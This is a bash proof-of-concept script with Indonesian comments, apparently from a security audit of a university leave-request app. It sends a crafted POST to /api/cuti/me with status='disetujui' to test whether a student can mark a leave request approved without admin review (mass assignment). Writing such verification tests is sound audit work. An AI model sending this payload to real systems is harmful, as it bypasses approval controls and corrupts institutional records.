#!/usr/bin/env bash
# S10 - Mass assignment status saat membuat pengajuan cuti (POST /api/cuti/me)
# Sink: src/controllers/cutiController.js create() -> if (req.body?.status) data.status = req.body.status;
# Prasyarat: peran mahasiswa, tidak sedang punya pengajuan aktif di semester berjalan.
# DESTRUKTIF (menyisakan data baru di DB) — ini memang membuktikan integritas yang diserang.
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
set -a; source "$REPO_ROOT/.env"; set +a
B="$BASE_URL"; ANH="Authorization: Bearer $ANDI_TOKEN"

echo "== S10: andi buat pengajuan cuti dengan status='disetujui' langsung =="
RESP=$(curl -s -m 10 -X POST "$B/api/cuti/me" -H "$ANH" -H 'Content-Type: application/json' \
  -d "{\"semester\":\"$SEMESTER_AKTIF\",\"kategori\":\"lainnya\",\"alasan\":\"PoC S10 mass assignment status\",\"alamat_cuti\":\"Jl Uji S10\",\"nomor_telepon\":\"0811000010\",\"status\":\"disetujui\"}")
echo "$RESP"
STATUS=$(echo "$RESP" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{process.stdout.write(JSON.parse(d).data.status)}catch(e){process.stdout.write('ERROR')}})")

echo
echo "status tersimpan: $STATUS"
if [ "$STATUS" = "disetujui" ]; then
  echo "KESIMPULAN: TERBUKTI. Mahasiswa membuat pengajuan cuti dengan status 'disetujui' tanpa melalui persetujuan admin."
elif [ "$STATUS" = "diajukan" ]; then
  echo "KESIMPULAN: TIDAK TERBUKTI pada percobaan ini (status tetap 'diajukan', field status diabaikan)."
else
  echo "KESIMPULAN: TIDAK BISA DIUJI (kemungkinan sudah ada pengajuan aktif di semester ini, lihat respons di atas)."
fi
